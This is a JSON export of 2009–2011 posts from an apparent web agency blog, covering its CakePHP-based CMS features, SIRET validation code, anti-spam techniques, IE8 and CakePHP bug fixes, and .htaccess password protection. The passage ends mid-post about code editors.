[{
  "id": 1,
  "name": "Ouverture",
  "text": "<p>Et voila le premier billet du blog de Pixelastic. Quel grand moment... Après tout ces durs mois de labeur pour réussir à se mettre d'accord sur le design et le logo (d'ailleurs, rien n'est encore définitif), le site est enfin en ligne.</p>\n<p>Il reste encore beaucoup de choses à faire, de pages à styler, de texte à écrire, mais on déballe nos cartons petit à petit.</p>\n<p>Bienvenue à tout le monde, et restez à l'écoute, ce blog va se remplir petit à petit lui aussi.</p>",
  "publish_start": "2009-02-14 00:00:00",
  "slug": "ouverture"
}, {
  "id": 2,
  "name": "Caracole -  Présentation",
  "text": "<p>L'un des principaux atouts que l'on mets en avant quand on propose nos services à nos clients c'est l'autonomie qu'ils auront dans la gestion de leur site web. J'entends trop souvent des clients qui possèdent déjà un site web me dire qu'ils veulent changer de prestataire car celui qu'ils ont actuellement est trop lent à réagir quand ils ont besoin d'une modification et surtout que la modification leur est facturée à chaque fois !</p>\n<p>J'ai toujours trouvé cette approche ridicule. D'une part parce que pour moi le client devient propriétaire du site et qu'il ne doit plus être dépendant de son prestataire une fois la livraison effectuée. Ensuite parce qu'il faut bien l'avouer, mettre à jour des textes, des images et des liens sur un site web qui n'est pas le notre, c'est pas la partie la plus excitante de notre métier.</p>\n<p>C'est pour ça que dès le début, j'ai voulu permettre à mes clients la plus grande flexibilité possible dans l'administration de leur site. Et c'est ainsi que j'ai commencé à développer des interfaces d'administration, et que de fil en aiguille <strong>Caracole </strong>a vu le jour.</p>\n<p>Caracole est un CMS, basé sur le framework cakePHP. Il permet dans sa version de base de gérer une architecture de site simple (Actualités, Pages, Formulaire de contact). Il a été pensé afin de simplifier au maximum la vie à la fois à l'utilisateur et au développeur.</p>\n<p>Pour l'utilisateur, l'interface d'administration est très simple d'utilisation et claire, pas besoin de compétences techniques pour s'en servir. Il suffit de quelques clics pour uploader et redimensionner une image, un éditeur de texte riche (tinyMCE) permet des mises en pages évoluées, un simple système de drag'n'drop permet de réordonner des éléments au sein d'une liste, une corbeille permet de ne pas perdre définitivement les éléments supprimés, on peut enregistrer son travail comme brouillon avant de le publier sur le site, etc, etc</p>\n<p>Pour le développeur, vu que tout cela est basé sur cakePHP, il est très simple d'ajouter de nouveaux modèles en plus de ceux existants pour s'adapter à tout type de projet. Beaucoup d'outils ont été intégrés pour éviter au maximum les taches fastidieuses et répétitives (compression des Javascript/CSS, CSS Sprite, réecriture d'url, intégration avec Firebug, etc).</p>\n<p><strong>Caracole </strong>est encore en développement, il reste plusieurs fonctionnalités que nous aimerions rajouter ainsi qu'un polissage de l'interface. Néanmoins il est suffisamment stable pour être utilisé, ce site en est un très bon exemple. Je posterai d'autres billets sur les différentes fonctionnalités utiles de Caracole dans les jours prochains.</p>",
  "publish_start": "2009-02-15 00:00:00",
  "slug": "caracole"
}, {
  "id": 4,
  "name": "Caracole - Brouillons",
  "text": "<p>Une des fonctionnalités les plus pratiques de Wordpress, c'est de pouvoir enregistrer un billet comme brouillon lorsqu'on ne l'a pas terminé. Ca permet d'y revenir plus tard et de le garder dans un coin sans qu'il ne soit perdu.</p>\n<p>J'ai ajouté cette fonctionnalité à Caracole hier, et elle peut s'appliquer à n'importe quel modèle (actuellement je l'ai mise sur les pages et les billets de blog uniquement, mais comme vous allez le voir, c'est très facile à ajouter pour n'importe quel modèle).</p>\n<p>Une case à cocher \"Enregistrer comme brouillon\" permet d'enregistrer l'élement comme brouillon, cela signifie qu'il ne sera plus visible sur le site tant qu'il restera à l'état de brouillon.</p>\n<p>Pour le développeur, c'est très simple à utiliser, il suffit de rajouter un champ 'is_draft' dans la table correspondante au modèle et Caracole se charge du reste. Les brouillons ne sont plus retournés par les recherches, à moins de préciser 'includeDraft' dans les options de recherche, ce qui permet de garder le code le plus clair possible.</p>\n<p>Dans l'admin, les brouillons restent bien sur visibles (bien qu'indiqués de façon légerement différente), et il suffit d'aller décocher la case pour les publier réellement.</p>",
  "publish_start": "2009-02-16 00:00:00",
  "slug": "caracole-brouillons"
}, {
  "id": 5,
  "name": "Caracole - Corbeille",
  "text": "<p>Dans la lignée du principe de brouillon j'ai aussi ajouté une fonction de \"Corbeille\". Ca fonctionne exactement comme celle du bureau de Windows qu'on est bien content d'avoir quand on a eu la main un peu généreuse dans les fichiers à supprimer.</p>\n<p>Elle fait office de sécurité et les éléments soit-disant supprimés ne sont pas réellement effacés instantanément, ils passent dans une corbeille intermédiaire. A partir de là, si on se rends compte qu'on a fait une bétise, on peut toujours les restaurer à leur état d'origine. Ou alors vider la corbeille de temps en temps pour faire de la place.</p>\n<p>Exactement de la même façon que pour les brouillons, il suffit ici d'ajouter un champ 'is_deleted' à la table du modèle correspondant pour lui ajouter la fonction de corbeille, Caracole se charge du reste.</p>\n<p>Les éléments supprimés ne sont plus retournés par les fonctions de recherche habituelle, à moins de préciser l'option 'includeDeleted'.</p>",
  "publish_start": "2009-02-17 00:00:00",
  "slug": "caracole-corbeille"
}, {
  "id": 7,
  "name": "Caracole - Référencement",
  "text": "<p>Le référencement est une des préocupations principales de nos clients, tous veulent savoir si avec le produit qu'on leur propose ils seront en mesure d'être les premiers dans les résultats Google.</p>\n<p>Bien qu'il n'existe pas de recette miracle pour parvenir à ce résultat, certaines sociétés sont spécialisés dans ce business et déploient des trésors d'ingéniosité pour réussir à faire grimper les pages de leurs clients dans les index des moteurs.</p>\n<p>Mais c'est un boulot à part entière, et ce n'est pas le nôtre. Nous faisons des sites web, à chacun sa spécialité.</p>\n<p>Malgré tout, il existe plusieurs bonnes pratiques qui permettent d'obtenir de bons résultats sans trop d'efforts, et Caracole s'en sort pas trop mal de ce coté là.</p>\n<p>Tout d'abord il tire parti de la façon dont les urls sont gérées par cakePHP, et donc aucune url ne contient de paramètre de la forme ?foo=bar&amp;action=foobar qui sont très mal indexées. Chaque page possède donc sa propre url unique. Les méthodes d'url rewriting proposées de base par cakePHP sont très puissantes et font déjà une très grosse partie du travail.</p>\n<p>Dans la même veine, il est possible de définir des 'slugs' pour chaque élément, un slug permet de donner un identifiant à chacune des pages, ce qui signifie qu'au lieu de retrouver un élément par son id dans l'url (un simple nombre, qui ne donne pas d'indication sur le contenu), on peut à la place le remplacer par un slug (du genre 'services', 'nous-contacter', etc). Cela donne des urls du genre /services.html, /posts/1:mon-premier-post, etc</p>\n<p>Cela facilite le référencement des pages car des mots clés se rapportant au contenu de la page peuvent déjà être mis dans l'url, qui est une place privilégiée.</p>\n<p>Ici encore, il suffit d'ajouter un champ 'slug' dans la table correspondante au modèle pour que celui-ci soit automatiquement généré à partir du nom (il est bien sur possible de le modifier si besoin).</p>\n<p>Caracole est aussi doté d'un système de génération automatique de sitemap (le plan du site). Celui-ci est généré en deux versions, une version html pour vos visiteurs, et une version XML (qui indique les fréquences de réactualisations ainsi que les dates de dernière modification) pour les moteurs.</p>\n<p style=\"text-align: left;\">Et pour finir, je vais passer rapidement sur les essentiels : balise &lt;title&gt; et meta description différents pour chaque page, fichier robots.txt, texte alternatif sur les images et accessibilité du markup HTML mais bien sur, Caracole se charge de tout cela aussi.</p>",
  "publish_start": "2009-02-18 00:00:00",
  "slug": "caracole-referencement"
}, {
  "id": 10,
  "name": "Caracole - Edition directe",
  "text": "<p>En plus de son interface d'administration complète, Caracole permet un mode d'édition rapide directement accessible depuis le coté front-end des sites, pour corriger rapidement un titre ou un coquille qui se serait glissée quelque part.</p>\n<p>Grâce à jQuery et cakePHP, cette fonctionnalité est très simple à utiliser. Il suffit pour cela d'avoir les droits d'administration sur le site que l'on veut modifier. Il suffit ensuite d'y naviguer avec un navigateur assez récent (cela signifie que IE6 n'y est pas convié) et s'affichera alors automatiquement en haut à gauche de l'écran un petit switch qui permet d'activer ou de désactiver en un clic le mode édition.</p>\n<p>Lorsque le mode d'édition est activé, il suffit de cliquer sur une zone que l'on veut modifier pour la transformer automatiquement en champ de formulaire modifiable (avec intégration de tinyMCE pour les grands textes). Il suffit alors de modifier le texte exactement comme on peut le faire dans l'admin et de valider. La modification est prise en compte automatiquement.</p>\n<p>Coté développeur, il suffit d'ajouter une class=\"editable\" ainsi qu'un id formé de la forme \"controller-champ-id\". Ainsi id=\"posts-text-12\" identifiera le champ \"text\" du 12e post.</p>\n<p>C'est extremement pratique pour modifier des fautes de frappe, ou faire des tas de petites modifications, je m'en sers énormément et c'est un pas de plus pour faciliter l'administration à l'utilisateur final.</p>",
  "publish_start": "2009-02-19 00:00:00",
  "slug": "caracole-edition-directe"
}, {
  "id": 11,
  "name": "Créer plusieurs formulaires sur la même page avec FormHelper::create",
  "text": "<p>CakePHP permet de créer très facilement des formulaires dont l'action (add/edit) ainsi que les champs sont remplis automatiquement grâce à FormHelper::create et FormHelper::end.</p>\n<p>Il prends pour cela les variables contenues dans le $data du controller, qui sont alors passées au $data de la vue.</p>\n<p>Si on veut changer le modèle et/ou les valeurs utilisées par le formulaire, il suffit de faire nos modifications dans le $this-&gt;data directement dans la vue avant d'appeller $form-&gt;create()</p>\n<p>Par contre, si sur une même page on possède plusieurs formulaires, tous d'un modele différent, l'astuce ne fonctionne plus. FormHelper s'est initialisé lors de son premier appel et utilisera le même set de model et valeurs pour les autres.</p>\n<p>Même modifier $this-&gt;data avant chaque appel à $form-&gt;create() ne changera rien.</p>\n<p>Il faut donc ruser et modifier la variable utilisée par le Helper, c'est à dire modifier $form-&gt;data à partir du second formulaire.</p>",
  "publish_start": "2009-02-20 00:00:00",
  "slug": "creer-plusieurs-formulaires-sur-la-meme-page-avec-formhelper-create"
}, {
  "id": 12,
  "name": "Faire communiquer PHP et Javascript",
  "text": "<p>Pour un projet sur lequel je suis en ce moment, je dois faire une interface d'administration assez complexe, le tout en AJAX.</p>\n<p>Je dois manipuler des données sorties de ma base de donnée, venant de trois modèles différents, mais liés les uns avec les autres. Autant dire que j'ai de gros tableaux imbriqués de données. La page travaille vraiment beaucoup et manipule ces données constamment.</p>\n<p>Pour éviter d'avoir à faire une requete sur ma base à chaque fois que j'ai besoin d'une information, j'ai décidé de tout charger une première fois au chargement de la page, puis de modifier coté client les variables sur lesquelles je travaille, pour ne faire des requetes au serveur qu'en upload (update/add) et ainsi éviter au maximum les requetes en download inutiles.</p>\n<p>Pour ça, j'utilise tout d'abord le base64 de php pour passer des objets complexes (au format JSON) à mes scripts. <a href=\"http://www.semnanweb.com/jquery-plugin/base64.html\" target=\"_blank\" title=\"jQuery BASE64 functions\">Muhammad Hussein Fattahizadeh</a> a pour cela mis à disposition une retranscription de l'encodage/decodage en base64 pour jQuery.</p>\n<p>Je peux stocker ainsi mes objets de façon \"dormante\" dans ma page, et les décoder pour récupérer/modifier les valeurs dont j'ai besoin avant de les réencoder et de les re-ranger dans mon DOM. L'avantage de stocker ces informations en base64 c'est que je ne risque pas de causer d'erreur de syntaxe, de balise non fermée, de caractère interdit, même si je manipule des objets contenant du code HTML et que j'ai besoin de le stocker dans mon propre DOM.</p>\n<p>J'utilise aussi à coté de ça le <a href=\"http://json.org/json2.js\" target=\"_blank\" title=\"parseur JSON\">parseur officiel JSON</a> pour parser mes éléments JSON. Il ne me reste plus qu'à passer mon élément JSON en paramètre aux fonction AJAX de jQuery pour mettre à jour mes données.</p>",
  "publish_start": "2009-02-21 00:00:00",
  "slug": "faire-communiquer-php-et-javascript"
}, {
  "id": 13,
  "name": "Validation et génération de numero de SIRET",
  "text": "<p>Pour le projet sur lequel je travaille actuellement, je dois tester la validatée d'un numero de SIRET. D'après <a title=\"SIRET\" href=\"http://fr.wikipedia.org/wiki/Syst%C3%A8me_d%E2%80%99identification_du_r%C3%A9pertoire_des_%C3%A9tablissements\" target=\"_blank\">Wikipédia</a> les numéros de SIRET possèdent une clé finale permettant de vérifier qu'ils soient biens formés.</p>\n<p>J'ai donc retranscris ce calcul sous une règle de validation pour cakePHP, le voici :</p>\n<pre><code lang=\"php\">function validateSiret($data, $field) {\n\t$siret = r(' ', '', $data[$field]);\n\t$sum = 0;\n\tfor($i=0;$i!=14;$i++) {\n\t\t$tmp = ((($i+1)%2)+1) * intval($siret[$i]);\n\t\tif ($tmp&gt;=10) $tmp-=9;\n\t\t$sum+=$tmp;\n\t}\n\treturn ($sum%10===0);\n}\n</code></pre>\n<p>Tout d'abord, je m'assure que le siret ne contienne pas d'espace. Puis je passe nombre après nombre pour calculer la somme (je multiplie par deux les nombres d'index pair et par un ceux d'index impair). Si le résultat est supérieur à 10, j'additionne chaque chiffre entre eux (ce qui équivant à soustraire 9).</p>\n<p>Si le résultat final est congru à 10, alors le numero de SIRET est valide.</p>\n<p>Il ne reste plus qu'à l'ajouter à mes régles de validation :</p>\n<pre><code lang=\"php\">var $validate = array(\n\t'siret' =&gt; array(\n\t\t'rule' =&gt; array('validateSiret', 'siret'),\n\t\t'message' =&gt; \"Le numero de SIRET indiqué n'est pas valide.\"\n\t)\n);\n</code></pre>\n<p>Mais ce n'est pas tout. Comme pour mes tests je crée à la volée des dizaines d'enregistrements, j'avais besoin d'un générateur automatique de numero de SIRET valides. Voici ce que j'ai fini par écrire :</p>\n<pre><code lang=\"php\">public function siret() {\n\t//On génère le début du numero de siret\n\t$siret = '';\n\t$sum = 0;\n\tfor($i=0;$i!=8;$i++) {\n\t\t$rand = mt_rand(0,9);\n\t\t$siret.=$rand;\n\t\t//On ajoute une fois le résultat si index impair, deux fois sinon\n\t\t$tmp = $rand * (1+($i+1)%2);\n\t\tif ($tmp&gt;=10) $tmp-=9;\n\t\t$sum+=$tmp;\n\t}\n\t//On ajoute 4 zeros\n\t$siret.=\"0000\";\n\t//On regarde combien il me manque pour etre congru à 10\n\t$diff = 10-($sum%10);\n\tif ($diff&gt;2) {\n\t\t$first = floor($diff/3);\n\t\t$second = $diff-(2*$first);\n\t\t$siret.=$first.$second;\n\t} else {\n\t\t$siret.='0'.$diff;\n\t}\n\n\treturn preg_replace(\"/([0-9]{3})([0-9]{3})([0-9]{3})([0-9]{5})/\", \"$1 $2 $3 $4\", $siret);\n }\n</code></pre>\n<p>Le principe consiste à générer les 8 premiers nombres de façon complétement aléatoire et d'en calculer la \"somme\" (selon le principe évoqué au dessus). Puis on ajoute des zero pour combler l'espace jusqu'à ajouter la clé de vérification.</p>\n<p>Bien sur, la clé on va la créer pour que la somme de (2 x le premier chiffre) + (1 x le second) soit égal à ce qu'il nous manque pour être congru à 10.</p>\n<p>Et on fini par retourner le numero de façon lisible, par exemple : 774 082 010 00034.</p>\n<p>J'ai fait une petite recherche sur <a title=\"Société.com\" href=\"http://www.societe.com/\" target=\"_blank\">societe.com</a>, aucun de mes numeros générés ne semble donner de résultat, malgré tout ils sont syntaxiquement valides.</p>",
  "publish_start": "2009-02-22 00:00:00",
  "slug": "validation-et-generation-de-numero-de-siret"
}, {
  "id": 14,
  "name": "Caracole - Export des adresses mails",
  "text": "<p>Je viens de rajouter une petite fonctionnalité sur Caracole qui permet d'exporter une liste d'adresses mails (actuellement les personnes souhaitant s'abonner à une newsletter) dans un format exploitable par les logiciels de messagerie et les webmail.</p>\n<p>La liste peut être exportée sous format vCard, ou encore CSV exploitable par Outlook ou GMail.</p>",
  "publish_start": "2009-02-23 00:00:00",
  "slug": "caracole-export-des-adresses-mails"
}, {
  "id": 15,
  "name": "Caracole - Spam sur les commentaires",
  "text": "<p>Les trois derniers sites que j'ai fait avec Caracole avaient tous un formulaire de contact (nom, mail et texte, pour contacter le propriétaire du site).</p>\n<p>Et tous les trois se sont fait spammer rapidement une fois que le site est arrivé dans les moteurs de recherche. J'ai donc cherché moyen d'empecher cela, une façon de detecter les spammeurs.</p>\n<p>Alors, il existe bien sur <a href=\"http://akismet.com/\" target=\"_blank\" title=\"Akismet\">Akismet</a>, qui marche du tonnerre, mais qui est payant pour un usage professionnel, j'ai donc d'abord cherché du coté des solutions gratuites.</p>\n<p>Il y a le projet <a href=\"http://recaptcha.net/\" target=\"_blank\" title=\"reCaptcha\">reCaptcha</a>, qui en plus d'empecher le spam, permet d'aider la numérisation de vieux livres, donc une assez bonne idée mais qui ne semble pas disponible en français. C'est malheureusement un impératif sur les sites que je développais.</p>\n<p>J'ai donc plutot retourné le problème dans ma tête et cherché un moyen facile et ingénieux de faire la différence entre un humain et un bot. J'ai finalement opté pour un champ caché au sein du formulaire qui doit absolument rester vide. Un bot le remplira automatiquement, un humain le laissera vide.</p>\n<p>J'avais tout d'abord mis ce champ en type=\"hidden\" et cela semblait fonctionner, mais de plus récents spams me l'ont fait passer en  display:none par CSS et je n'ai pas eu de nouveau spam depuis. Je continuerai de peaufiner le système jusqu'à ce que je trouve un blocage parfait ou que j'en ai marre et que je me tourne vers Akismet :)</p>\n<p>Pour le moment, je loggue toutes les demandes de contact avec les informations du Header, afin d'identifier certains patterns qui pourraient me permettre de trouver plus facilement les spammeurs dans le lot.</p>",
  "publish_start": "2009-02-24 00:00:00",
  "slug": "caracole-spam-sur-les-commentaires"
}, {
  "id": 16,
  "name": "Caracole - Antispam des adresses mails",
  "text": "<p><strong>Attention : Ce post n'est plus d'actualité. Je n'utilise plus du tout cette technique pour masquer les adresses mails car elle bloquait complétement la lisibilité aux personnes sans Javascript. Je n'ai pas encoe trouvé de meilleure alternative pour le moment, néanmoins.</strong></p>\n<p>Pour faire suite au billet précédent, un autre problème que j'ai rencontré dans le développement des sites était un moyen sûr d'empecher qu'une adresse mail exposée sur un site ne soit récupérée par des robots crawlers et ne deviennent la cible de leurs spams.</p>\n<p>Je parse donc chaque texte affiché afin de remplacer les adresses mails par une version cryptée, que Javascript décryptera à l'affichage. A chaque affichage la clé de cryptage est différente. Bon, l'algorithme de cryptage est extremement simple, c'est juste une permutation alphabétique, chaque lettre est remplacée par une autre. Et la clée est indiqué dans l'attribut title de mon code généré.</p>\n<p>Il suffit d'étudier le Javascript pour réussir à comprendre comment décrypter les mails, mais cela demande que le robot ai intégré mon codage dans ses paramètres, ce qui n'est à priori pas le cas. Et quand bien même se serait le cas, je changerai la façon de crypter la clé.</p>\n<p>Jetez un oeil au code source de cette page si vous le souhaitez pour voir comment cette adresse : blabla@somewhere.com est écrite.</p>\n<p>Cela devrait être quelque chose de la forme :</p>\n<pre>&lt;<span class=\"start-tag\">span</span><span class=\"attribute-name\"> <br /></span>\t<span class=\"attribute-name\">title</span>=<span class=\"attribute-value\">\"97tasbw84fv6_q3pn5yirchya15nq.p9b_jziggtc40lfolwxxk@meo26m70zj2d-sur@hev8u1-dk.3\" </span><span class=\"attribute-name\"><br /></span>\t<span class=\"attribute-name\">class</span>=<span class=\"attribute-value\">\"protectFromSpam\"</span>&gt;<br />\t<br />\t&lt;<span class=\"start-tag\">span</span><span class=\"attribute-name\"> class</span>=<span class=\"attribute-value\">\"noscript\"</span>&gt;<br />\t\t&lt;<span class=\"start-tag\">span</span><span class=\"attribute-name\"> class</span>=<span class=\"attribute-value\">\"icon icon_notice\"</span>&gt;&lt;/<span class=\"end-tag\">span</span>&gt;<br />\t\tCette adresse mail est protégée contre le spam, vous devez activer Javascript pour pouvoir la voir.<br />\t&lt;/<span class=\"end-tag\">span</span>&gt;<br />\t<br />\t&lt;<span class=\"start-tag\">span</span><span class=\"attribute-name\"> class</span>=<span class=\"attribute-value\">\"cryptedMail\"</span>&gt;ageh9gxvw1bag4342e&lt;/<span class=\"end-tag\">span</span>&gt;<br />\t<br />&lt;/<span class=\"end-tag\">span</span>&gt;</pre>\n<p>Bon alors bien sur, cela nécessite Javascript activé, c'est un gros défaut, je l'admets. Un message permet de ne pas laisser l'utilisateur sans JS dans l'incompréhension, mais ça reste problématique malgré tout. Je n'ai pas réussi à faire mieux pour le moment.</p>",
  "publish_start": "2009-02-25 00:00:00",
  "slug": "caracole-antispam-des-adresses-mails"
}, {
  "id": 17,
  "name": "Caracole - Gestion des flux RSS",
  "text": "<p>Cela faisait quelques temps que je souhaitais ajouter une gestion des flux RSS à Caracole. J'ai donc recherché du coté du RssHelper intégré à cakePHP et l'ai quelque peu modifié pour qu'il s'adapte à mes besoins.</p>\n<p>En effet, il manquait selon moi quelques fonctions extremement importantes pour la génération d'un flux complet, par exemple la possibilité de spécifier des attributs aux différents noeuds, ou encore de passer le contenu entre balises &lt;![CDATA[]]&gt;.</p>\n<p>Mais surtout la possibilité d'ajouter des noeuds de façons récursive, la fonction RssHelper::item() ne permettant d'ajouter des noeuds qu'à un seul niveau.</p>\n<p>Bref, j'ai revu tout cela dans ma propre version du Helper, avec une autre fonction pratique pour ajouter un thumbnail à un post. Pour voir ce que cela donne, et il vous suffit de vous abonner aux flus disponibles sur les pages du blog ou sur la page <a href=\"/realisations/\" title=\"nos réalisations\">Réalisations</a></p>\n<p>J'ai découvert la syntaxe d'un flux RSS il y a seulement quelques jours, et je n'ai testé le résultat qu'avec Netvibes, je pense donc qu'il me faut me livrer à quelques tests supplémentaires.</p>\n<p>En tout cas, il me suffit maintenant d'ajouter une variable $rssFeed à un modèle pour qu'un flux RSS lui soit automatiquement généré (on peut préciser bien sur les informations devant être affichées pour chaque modèle). Voila qui encore un pas de plus pour Caracole :)</p>",
  "publish_start": "2009-03-01 23:10:47",
  "slug": "caracole-gestion-des-flux-rss"
}, {
  "id": 255,
  "name": "IE8 ghost :after and :before pseudo elements",
  "text": "<p>IE8 has a strange bug (<em>what bugs aren't strange in IE ?</em>) when dealing with <code>:after</code> and <code>:before</code> pseudo-elements.</p>\n<p>I was adding a nice looking arrow after one of my elements using <code>:after</code>. I wanted this arrow to only display when my element was hovered, so I wrote the following code :</p>\n<pre><code lang=\"html\">&lt;a href=\"#\"&gt;Example&lt;/a&gt;</code></pre>\n<pre><code lang=\"css\">a {<br />\tposition:relative;<br />\tdisplay:block; <br />\theight:30px;<br />}<br />a:after {<br />\tposition:absolute;<br />\tcontent:\"\";<br />\ttop:0px; <br />\tright:-15px;<br />\twidth:15px;<br />\theight:30px;<br />\tbackground:url(arrow.gif) top left no-repeat; <br />\tdisplay:none;<br />}<br />a:hover:after {<br />\tdisplay:block;<br />}</code></pre>\n<p>As you can see, nothing too fancy. I positionned my arrow using an empty <code>:after</code> element and a <code>background </code>image. I defaulted the arrow to hidden, and only show it when hovering the element.</p>\n<h4>IE in action</h4>\n<p>It does work pretty well in moder browsers. It also seems to work on IE8. When you hover the element in IE8, the arrow gets displayed. But it does not gets hidden when you stop hovering it.</p>\n<p>There's a kind of ghost element that keeps getting displayed. It gets removed if you directly mouse it, or scroll your page, or alt-tab, etc. This clearly is a display artefact.</p>\n<p>To counter this I had to write it in an other fashion (less readable in my opinion). Removing the default <code>a:after</code> rule and adding all properties to <code>a:hover:after</code> :</p>\n<pre><code lang=\"css\">a {<br />\tposition:relative;<br />\tdisplay:block;<br />\theight:30px;<br />}<br />a:hover:after {<br />\tposition:absolute;<br />\tcontent:\"\";<br />\ttop:0px;<br />\tright:-15px;<br />\twidth:15px;<br />\theight:30px;<br />\tbackground:url(arrow.gif) top left no-repeat;<br />\tdisplay:block;<br />}<br /></code></pre>\n<h4>Update</h4>\n<p>It should be noted that more generally, I gets confused and create ghost elements and styling when we try to update the <code>:after</code>/<code>:before</code> properties based on a rule selecting its parent.</p>\n<p>There seems to have a little lag/delay before the properties gets applied, and most of the time they do not.</p>",
  "publish_start": "2011-01-07 11:56:27",
  "slug": "ie8-ghost-pseudo-elements"
}, {
  "id": 256,
  "name": "Apache rewrite_mod small tip",
  "text": "<p>Did you know that when debugging <code>RewriteRule</code>s, instead of commenting/uncommenting each line, you can simply make <code>RewriteEngine On</code> / <code>RewriteEngine Of</code>f all along your code ?</p>\n<p>I didn't, and now that I do it seems so obvious I don't believe I've never thought of that before...</p>",
  "publish_start": "2011-01-10 17:09:51",
  "slug": "apache-rewrite-mod-small-tip"
}, {
  "id": 257,
  "name": "Strange requestAction bug changing the page Content-Type",
  "text": "<p>Today, I thought my current project was finished. But I had this bug report in my tracker from one of the beta-tester telling me that one of the page wasn't rendered properly.</p>\n<p>It says that the code source was displayed on screen instead of being rendered as HTML. And only on Firefox.</p>\n<p>And if that wasn't odd enough, even with the plethora of Firefox versions I got, I couldn't reproduce the bug on my side.</p>\n<h4>Turning off the debugger to debug</h4>\n<p>Then I had an idea. I turned off the debug mode, and was then able to reproduce the infamous bug.</p>\n<p>As I initially supposed, there was something wrong with the <code>Content-Type</code> header. The Firebug Net Panel told me that it was set as <code>text/plain</code> while the developer toolbar insisted that it was <code>text/html</code>.</p>\n<p>After some digging in my own code, I found the culprit. A <code>requestAction()</code> call I made as part of an update process. This <code>requestAction </code>was targeted at a <code>.txt</code> file.</p>\n<p>I played a little with the debug value and found that for any value above 2, everything was working correctly, but if I set my value below that threshold, my whole view will get displayed as <code>text/plain</code>.</p>\n<p>I couldn't quite explain why a debug value will have anything to with the view rendering. I even disabled the Debug Kit component, just to be sure.</p>\n<h4>Digging into cake world</h4>\n<p>And then I decided to follow the dispatch trace to find where the debug value was being used. After a long journey, I got to the <code>respondAs </code>method of the <code>RequestHandler </code>component.</p>\n<p>And specifically, to that part :</p>\n<pre><code lang=\"php\">if (Configure::read() &lt; 2 &amp;&amp; !defined('CAKEPHP_SHELL')) {<br />\t$this-&gt;_header($header);<br />}</code></pre>\n<p>Ok, so there was my debug value. Exactly the code reponsible for my symptoms. Well, I still don't understand WHY someone wanted to add an header based on the debug value, but I could easily understand HOW it made my view that ugly.</p>\n<p>The <code>requestAction </code>was being dispatched all along the way to its final action, firing the <code>RequestHandler </code>component on its way. Its extension being <code>.txt</code>, <code>RequestHandler </code>will fire its <code>respondAs</code> method and set the appropriate header.</p>\n<p>Unfortunatly, setting such an header in a <code>requestAction </code>wasn't useful for the request, and additionnaly, it was messing with the primary view dispatch path.</p>\n<h4>Solution</h4>\n<p>I<a href=\"http://cakephp.lighthouseapp.com/projects/42648-cakephp/tickets/1445-requestaction-may-change-the-current-layout-depending-on-debug-value\" target=\"_blank\"> reported the bug</a> hoping for a fix in a future version. For the time being, I manually set the debug to 2 before calling my <code>requestAction</code>, and set it back to its previous value after in my app.</p>\n<p>And for why it was only buggy on Firefox, it was caused by a double header definition. A first header was telling <code>text/plain</code> and a second one<code> text/html</code>. I guess Firefox uses the first one while other browsers the last. This is what made Firebug and the Developer Toolbar return different results too.</p>\n<br />",
  "publish_start": "2011-01-11 23:24:15",
  "slug": "strange-requestaction-bug-changing-page-content-type"
}, {
  "id": 258,
  "name": "Protecting a directory using HTTP Auth on Dreamhost with cakePHP",
  "text": "<p>One can protect the browsing of a special directory with a simple set of login/password by using appropriate <code>.htaccess</code>/<code>.htpasswd</code> files.</p>\n<h4>The classic way</h4>\n<p>Just create an <code>.htaccess</code> in the directory you want to protect with the following lines :</p>\n<pre><code lang=\"apache\">AuthName \"Restricted Access\"<br />AuthType Basic<br />AuthUserFile /full/path/to/your/.htpasswd<br />&lt;Limit GET POST PUT&gt;<br />Require valid-user<br />&lt;/Limit&gt;</code></pre>\n<p>And to create the .htpasswd file, run the following command :</p>\n<pre><code lang=\"sh\">htpasswd -c /full/path/to/your/.htpasswd username</code></pre>\n<p>The <code>-c</code> modifier will create the file, omit it if you only want to add a new user. Also change the path to your <code>.htpasswd</code> file (moving it out of the webdir could be a good idea) and change <code>username </code>to any login you want.</p>\n<p>You'll then be prompted to enter the password (twice) and your file will be generated.</p>\n<h4>cakePHP and Dreamhost fixed</h4>\n<p>I had an issue when protecting a folder in my <code>app/webroot/ </code>folder on Dreamhost. I'm not sure it is completly cake related nor Dreamhost related but the two together made it quite hard to debug.</p>\n<p>Anyway, it appears that when issuing an HTTP Auth, Dreamhost redirect to a file named <code>/failed_auth.html</code> (this is the file you're supposed to see when your Auth fails, obviously).</p>\n<p>But as I didn't have such a file in my app, everytime I tried to access my protected dir, I got my custom 404 error page.</p>\n<p>To finally fix that, all I had to do was to create a real <code>failed_auth.html</code> page, or in my case, create a Route that redirect <code>failed_auth.html</code> to a custom failed auth page.</p>\n<p>I guess just dropping a <code>failed_auth.html</code> file in <code>app/webroot/ </code>could have done the trick too.</p>",
  "publish_start": "2011-01-20 08:35:56",
  "slug": "protecting-directory-http-auth-dreamhost-cakephp"
}, {
  "id": 260,
  "name": "Going to parent folder in Windows 7 Explorer",
  "text": "<p>At first I thought I missed an option somewhere, but now I have to admit : Microsoft removes the \"Go to parent folder\" button in the Windows 7 version of Explorer.</p>\n<p>I like their new implementation of folder path, but a fast click to go up one level, positionned in a consistent way in the UI is a plus.</p>\n<p>After some research I found the <code>Alt + Up</code> keyboard shortcut to achieve the same result, but while navigating through the explorer, I always am using my mouse. Switching from mouse to keyboard is tedious, so I hunt for another solution.</p>\n<p>I finally installed <a href=\"http://sourceforge.net/projects/classicshell/\" target=\"_blank\">ClassicShell </a>that adds the missing button as well as some other minor cosmetics changes.</p>",
  "publish_start": "2011-01-21 18:04:36",
  "slug": "parent-folder-windows-7-explorer"
}, {
  "id": 19,
  "name": "Komodo Edit",
  "text": "<p>J'ai utilisé de nombreux éditeurs depuis que j'ai commencé à coder, et au fil du temps j'ai changé. Souvent parce qu'un bug particulier de ma version me dérangeait beaucoup, ou parce que j'avais besoin d'une fonctionnalité que je ne pouvais trouver que chez un concurrent.</p>\n<p>Je suis resté très longtemps sur Webexpert, fais un court passage par Aptana, avant de rester pendant les quelques dernières années sur Intype. Et aujourd'hui, je viens de découvrir Komodo Edit.</p>\n<p>Webexpert avait tout ce dont j'avais besoin il y a quelques années, mais il plantait sans raison assez souvent. Et quand je voyais ce que pouvais proposer un logiciel comme Aptana avec son parseur intégré, son autocomplete de code, etc je me disais que j'étais vraiment à la préhistoire.</p>\n<p>J'ai donc essayé Aptana, mais je m'en suis vite lassé, c'est une usine à gaz. Il sait certes tout faire mais il était lent, et j'avais besoin de pouvoir m'en servir rapidement.</p>\n<p>Je suis donc passé à Intype, qui est très léger et qui possédait exactement tout ce dont j'avais besoin et il le faisait bien. C'était aussi le premier éditeur qui me permettait 